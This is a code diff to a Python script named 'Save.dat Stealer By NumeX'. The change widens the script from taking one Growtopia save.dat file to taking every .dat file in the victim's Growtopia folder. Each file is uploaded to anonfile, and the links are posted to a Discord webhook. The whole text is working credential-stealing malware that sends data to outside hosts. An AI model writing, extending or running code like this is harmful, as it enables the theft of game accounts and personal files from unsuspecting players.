@@ -5,8 +5,9 @@ import os
 from pathlib import Path
 import requests
 import json
+import glob
 
-webhook = "Your Webhook URL"
+webhook = "Your Discord Webhook URL"
 
 home = Path.home()
 path = str(home)
@@ -19,18 +20,23 @@ ff.close()
 # Save.dat Path : '\AppData\Local\Growtopia\save.dat'
 
 def steal():
-	data = {'file': (open(path + '\AppData\Local\Growtopia\save.dat', "rb"))}
-	r = requests.post('https://api.anonfile.com/upload', files=data)
-	resp = json.loads(r.text)
-	if resp['status']:
-		urllong = resp['data']['file']['url']['full']
-		urlshort = resp['data']['file']['url']['short']
-		payload = {'content': f"**Save.dat Stealer By NumeX**\n**URL Long** : `{urllong}`\n**URL Short** : `{urlshort}`"}
-		requests.post(webhook, json=payload)
-	else:
-		message = resp['error']['message']
-		errtype = resp['error']['type']
-		print(f'[ERROR] {message}\n{errtype}')
+	for i in glob.glob(f'{path}\AppData\Local\Growtopia\*.dat'):
+		if '.' in i:
+			data = {'file': (open(i, "rb"))}
+			r = requests.post('https://api.anonfile.com/upload', files=data)
+			resp = json.loads(r.text)
+		else:
+			pass
+
+		if resp['status']:
+			urllong = resp['data']['file']['url']['full']
+			urlshort = resp['data']['file']['url']['short']
+			payload = {'content': f"**Save.dat Stealer By NumeX**\n**URL Long** : `{urllong}`\n**URL Short** : `{urlshort}`"}
+			requests.post(webhook, json=payload)
+		else:
+			message = resp['error']['message']
+			errtype = resp['error']['type']
+			print(f'[ERROR] {message}\n{errtype}')
 
 if __name__ == "__main__":
 	steal()
